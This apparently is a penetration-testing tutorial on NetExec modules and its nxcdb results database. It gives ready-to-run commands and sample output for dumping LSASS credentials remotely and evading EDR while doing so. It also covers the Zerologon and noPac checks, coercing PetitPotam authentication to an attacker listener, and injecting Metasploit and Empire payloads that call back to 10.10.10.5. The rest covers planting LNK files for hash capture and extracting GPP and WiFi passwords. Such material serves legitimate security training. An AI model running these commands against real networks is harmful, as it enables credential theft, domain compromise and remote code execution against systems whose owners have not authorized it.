# NXC Modules System and Database

## NXC Module System Overview

NXC has a powerful module system that extends its capabilities beyond basic authentication and enumeration. Modules are plugins that perform specific tasks such as credential dumping, vulnerability checking, and data collection.

### Listing Available Modules

```bash
# List all available modules for a protocol
nxc smb -L
nxc ldap -L
nxc winrm -L
nxc mssql -L
```

**Example output (partial):**
```
[*] met_inject             Inject a Met payload via PowerShell
[*] lsassy                 Dump credentials from lsass remotely
[*] mimikatz               Execute Mimikatz remotely
[*] spider_plus            List files on the target server
[*] procdump               Dump lsass via ProcDump
[*] nanodump               Dump lsass via nanodump
[*] zerologon              Check/exploit CVE-2020-1472
[*] petitpotam             Coerce authentication via PetitPotam
[*] nopac                  Check/exploit CVE-2021-42278/42287
[*] bloodhound             Collect BloodHound data
[*] empire_exec            Execute Empire stager
[*] get_netconnections     Get active network connections
[*] enum_av                Enumerate antivirus products
[*] rdp                    Enable/disable RDP
[*] webdav                 Check for WebDAV
[*] slinky                 Create LNK files for hash capture
[*] gpp_password           Find Group Policy Preferences passwords
[*] gpp_autologin          Find Group Policy autologin credentials
[*] handlekatz             Dump LSASS via handlekatz
[*] impersonate            Impersonate logged-on users
[*] ntdsutil               Dump NTDS.dit via ntdsutil
[*] runasppl               Check/bypass RunAsPPL
[*] wifi                   Extract saved WiFi passwords
[*] dpapi_creds            Extract DPAPI credentials
[*] keepass_trigger        Extract KeePass credentials via trigger
```

### Using a Module

```bash
# General module syntax
nxc <protocol> <target> -u <user> -p <pass> -M <module_name>

# Module with options
nxc <protocol> <target> -u <user> -p <pass> -M <module_name> -o OPTION1=value1 OPTION2=value2
```

### Getting Module Help

```bash
# Show module options
nxc smb 192.168.1.10 -M lsassy --options
```

---

## Key Modules In Depth

### lsassy — Remote LSASS Credential Dump

Lsassy dumps credentials from the LSASS process memory remotely without dropping Mimikatz to disk. This is one of the most valuable post-exploitation modules.

```bash
# Basic lsassy dump
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M lsassy
```

**Example output:**
```
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.20    445    WS01             [*] Executing lsassy
SMB         192.168.1.20    445    WS01             CORP.LOCAL\admin.jones                    5f4dcc3b5aa765d61d8327deb882cf99
SMB         192.168.1.20    445    WS01             CORP.LOCAL\t.williams                     e19ccf75ee54e06b06a5907af13cef42
SMB         192.168.1.20    445    WS01             CORP\WS01$                                a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```

```bash
# Lsassy with specific dump method
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M lsassy -o METHOD=comsvcs

# Available methods: comsvcs, procdump, dumpert, nanodump, handlekatz, rdrleakdiag, wer, ppldump
```

**OPSEC notes:**
- lsassy is stealthier than uploading Mimikatz
- The comsvcs method uses a built-in Windows DLL (comsvcs.dll) to dump LSASS
- Still may trigger EDR/AV alerts on modern systems
- Creates a minidump file temporarily on the target

### mimikatz — Remote Mimikatz Execution

Executes Mimikatz commands remotely via NXC:

```bash
# Run Mimikatz remotely
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M mimikatz
```

**Example output:**
```
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.20    445    WS01             [*] Executing Mimikatz
SMB         192.168.1.20    445    WS01             Authentication Id : 0 ; 999 (00000000:000003e7)
SMB         192.168.1.20    445    WS01             msv :
SMB         192.168.1.20    445    WS01              [00000003] Primary
SMB         192.168.1.20    445    WS01              * Username : admin.jones
SMB         192.168.1.20    445    WS01              * Domain   : CORP
SMB         192.168.1.20    445    WS01              * NTLM     : 5f4dcc3b5aa765d61d8327deb882cf99
```

```bash
# Run specific Mimikatz command
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M mimikatz -o COMMAND='sekurlsa::logonpasswords'
```

**OPSEC notes:**
- Extremely noisy — Mimikatz binary is flagged by nearly all AV/EDR products
- May be blocked by Credential Guard on modern Windows
- Use lsassy instead when possible

### spider_plus — Advanced Share Spidering

spider_plus is a more powerful alternative to the built-in `--spider` flag. It indexes all files on shares and outputs structured JSON results.

```bash
# Spider all readable shares
nxc smb 192.168.1.30 -u jsmith -p 'Password123' -M spider_plus
```

**Example output:**
```
SMB         192.168.1.30    445    FILE01           [+] CORP.LOCAL\jsmith:Password123
SMB         192.168.1.30    445    FILE01           [*] Started spidering
SMB         192.168.1.30    445    FILE01           [*] Spidering share: IT_Share
SMB         192.168.1.30    445    FILE01           [*] Spidering share: HR_Data
SMB         192.168.1.30    445    FILE01           [*] Done spidering (Completed)
SMB         192.168.1.30    445    FILE01           [*] Saved share-file metadata to /tmp/nxc_spider_plus/192.168.1.30.json
```

```bash
# Spider with exclusions and options
nxc smb 192.168.1.30 -u jsmith -p 'Password123' -M spider_plus -o EXCLUDE_DIR=Windows,ProgramData READ_ONLY=false
```

### procdump — LSASS Dump via ProcDump

Uses Microsoft's legitimate ProcDump tool to dump LSASS:

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M procdump
```

**OPSEC notes:**
- ProcDump is a signed Microsoft tool (less suspicious)
- Still triggers on LSASS access in modern EDR
- The dump file must be transferred and parsed offline

### nanodump — Stealthy LSASS Dump

nanodump is designed to evade detection by using direct syscalls and other evasion techniques:

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M nanodump
```

**OPSEC notes:**
- More evasive than procdump or comsvcs
- Uses direct syscalls to avoid API hooking
- Can produce an obfuscated dump format
- Best option when EDR is active

### zerologon — CVE-2020-1472

Checks for and exploits the Zerologon vulnerability (CVE-2020-1472), which allows unauthenticated domain controller compromise:

```bash
# Check if vulnerable (safe, does not exploit)
nxc smb 192.168.1.10 -u '' -p '' -M zerologon
```

**Example output (vulnerable):**
```
SMB         192.168.1.10    445    DC01             [*] Windows Server 2016 Build 14393 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.1.10    445    DC01             [+] DC01 is vulnerable to CVE-2020-1472 (Zerologon)
```

**WARNING:** The exploit changes the DC machine account password to empty — this can break the domain. Only check, never exploit without authorization and rollback plan.

**CVE-2020-1472 details:**
- CVSS: 10.0 (Critical)
- Affects: Windows Server 2008 R2 through 2019 (unpatched)
- Allows: Unauthenticated domain admin compromise
- Patched: August 2020 security update

### petitpotam — Authentication Coercion

Coerces a target to authenticate to an attacker-controlled server via MS-EFSRPC:

```bash
# Coerce authentication (requires a listener like Responder or ntlmrelayx)
nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M petitpotam -o LISTENER=10.10.10.5
```

**Example output:**
```
SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\jsmith:Password123
SMB         192.168.1.10    445    DC01             [+] PetitPotam attack succeeded — authentication coerced to 10.10.10.5
```

**Use case:** Combined with ntlmrelayx to relay the DC's machine account hash to AD CS for a certificate, achieving domain admin.

### nopac — CVE-2021-42278/42287

Checks for the sAMAccountName spoofing vulnerability:

```bash
# Check if vulnerable
nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M nopac
```

**Example output:**
```
SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\jsmith:Password123
SMB         192.168.1.10    445    DC01             [+] DC01 is vulnerable to CVE-2021-42278 (noPac/sAMAccountName spoofing)
```

**CVE details:**
- CVE-2021-42278 + CVE-2021-42287
- Allows any domain user to impersonate the DC machine account
- Results in full domain compromise
- Patched: November 2021 security update

### bloodhound — BloodHound Data Collection

Collects BloodHound-compatible data via NXC:

```bash
nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M bloodhound -o COLLECTION=All
```

### empire_exec — Empire Stager Execution

Executes a PowerShell Empire stager:

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M empire_exec -o LISTENER=http
```

### met_inject — Metasploit Payload Injection

Injects a Metasploit payload via PowerShell:

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M met_inject -o LHOST=10.10.10.5 LPORT=4444
```

### get_netconnections — Active Network Connections

Retrieves active network connections from a target:

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M get_netconnections
```

### enum_av — Enumerate Antivirus

Detects antivirus/EDR products installed on the target:

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M enum_av
```

**Example output:**
```
SMB         192.168.1.20    445    WS01             [+] CORP.LOCAL\administrator:Password123 (Pwn3d!)
SMB         192.168.1.20    445    WS01             [*] Windows Defender detected
SMB         192.168.1.20    445    WS01             [*] Carbon Black detected
```

### gpp_password — Group Policy Preferences Passwords

Finds and decrypts passwords stored in Group Policy Preferences:

```bash
nxc smb 192.168.1.10 -u jsmith -p 'Password123' -M gpp_password
```

**Example output:**
```
SMB         192.168.1.10    445    DC01             [+] CORP.LOCAL\jsmith:Password123
SMB         192.168.1.10    445    DC01             [+] Found credentials in Groups.xml
SMB         192.168.1.10    445    DC01             Username: local_admin  Password: Summer2024!
```

### wifi — Extract Saved WiFi Passwords

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M wifi
```

### webdav — Check for WebDAV

```bash
nxc smb 192.168.1.20 -u jsmith -p 'Password123' -M webdav
```

WebDAV enabled hosts can be abused for coercion attacks (similar to PetitPotam).

### slinky — Create LNK Files

Creates malicious .lnk files on writable shares for hash capture:

```bash
nxc smb 192.168.1.30 -u jsmith -p 'Password123' -M slinky -o SERVER=10.10.10.5 NAME=important
```

### impersonate — Token Impersonation

```bash
nxc smb 192.168.1.20 -u administrator -p 'Password123' -M impersonate
```

Lists tokens available for impersonation on the target host.

---

## NXC Database (nxcdb)

NXC maintains a local database that stores discovered hosts, credentials, and shares across engagements. This is accessed via the `nxcdb` command.

### Launching the Database Console

```bash
nxcdb
```

**Example prompt:**
```
nxcdb (default)(smb) >
```

### Switching Workspaces

```bash
# List workspaces
nxcdb (default)(smb) > workspace list

# Create a new workspace for an engagement
nxcdb (default)(smb) > workspace create pentest_corp

# Switch to a workspace
nxcdb (default)(smb) > workspace pentest_corp
```

### Switching Protocols

```bash
nxcdb (default)(smb) > proto ldap
nxcdb (default)(ldap) > proto smb
nxcdb (default)(smb) > proto winrm
```

### Viewing Stored Hosts

```bash
nxcdb (default)(smb) > hosts
```

**Example output:**
```
+----+---------------+------+--------+----------+------------+---------+--------+
| id | ip            | port | hostname| domain   | os         | signing | smbv1  |
+----+---------------+------+--------+----------+------------+---------+--------+
| 1  | 192.168.1.10  | 445  | DC01   | CORP.LOCAL| Windows Server 2019 | True | False |
| 2  | 192.168.1.20  | 445  | WS01   | CORP.LOCAL| Windows 10 | False  | False  |
| 3  | 192.168.1.25  | 445  | SQL01  | CORP.LOCAL| Windows Server 2016 | False | False |
| 4  | 192.168.1.30  | 445  | FILE01 | CORP.LOCAL| Windows Server 2016 | False | True  |
+----+---------------+------+--------+----------+------------+---------+--------+
```

### Viewing Stored Credentials

```bash
nxcdb (default)(smb) > creds
```

**Example output:**
```
+----+---------------+------------+-----------+-----------------------------------+
| id | domain        | username   | password  | hash                              |
+----+---------------+------------+-----------+-----------------------------------+
| 1  | CORP.LOCAL    | jsmith     | Password123 |                                 |
| 2  | CORP.LOCAL    | svc_sql    | Summer2024! |                                 |
| 3  | CORP.LOCAL    | administrator |         | 5f4dcc3b5aa765d61d8327deb882cf99  |
| 4  | WS01          | localadmin |             | e19ccf75ee54e06b06a5907af13cef42  |
+----+---------------+------------+-----------+-----------------------------------+
```

### Viewing Stored Shares

```bash
nxcdb (default)(smb) > shares
```

### Querying Specific Data

```bash
# Find hosts where a specific user has admin
nxcdb (default)(smb) > hosts --user administrator

# Find credentials for a specific domain
nxcdb (default)(smb) > creds --domain CORP.LOCAL
```

### Exporting Data

```bash
# Export credentials
nxcdb (default)(smb) > export creds csv /tmp/creds.csv

# Export hosts
nxcdb (default)(smb) > export hosts csv /tmp/hosts.csv
```

### Database Location

The NXC database is stored at:
- `~/.nxc/workspaces/default/smb.db` (SQLite)
- Each protocol has its own database file
- Each workspace has its own set of databases

### Automatic Storage

NXC automatically stores results in the database as you run commands. Every successful authentication, host discovery, and credential dump is saved. This means you can:

1. Run a sweep of the network
2. Later query the database for all discovered hosts with SMB signing disabled
3. Cross-reference credentials with hosts where they grant admin access

This makes nxcdb an essential tool for organizing findings during large engagements.
